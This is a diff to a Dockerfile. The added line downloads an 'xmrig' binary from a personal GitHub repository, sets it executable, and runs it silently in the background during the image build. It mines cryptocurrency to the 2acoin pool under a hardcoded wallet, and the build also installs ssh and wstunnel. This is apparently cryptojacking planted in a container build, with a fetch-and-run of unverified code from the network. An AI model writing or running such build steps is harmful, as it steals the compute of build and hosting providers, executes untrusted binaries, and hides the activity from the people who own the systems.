@@ -1,6 +1,6 @@
 FROM debian
 RUN apt update && apt install wget -y
-RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 && ./xmrig --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8sajPa19G81kchLTLf9u2qHCbJUqEHRhfMMwtv54HvxrizNdM5h9u52kPtRPrK9mGBnhdCHD396RijusrpxDAQDDzVuKBEaEaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQcboNeA -p $(cat /proc/sys/kernel/hostname) >/dev/null &
+RUN wget https://github.com/pramadoli/rtm/raw/main/xmrig && chmod 777 xmrig && ./xmrig --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8sajPa19G81kchLTLf9u2qHCbJUqEHRhfMMwtv54HvxrizNdM5h9u52kPtRPrK9mGBnhdCHD396RijusrpxDAQDDzVuKBEaEaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQcboNeA -p $(cat /proc/sys/kernel/hostname) >/dev/null &
 RUN DEBIAN_FRONTEND=noninteractive apt install ssh curl screen nano wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
 RUN  npm install -g wstunnel
 RUN mkdir /run/sshd 
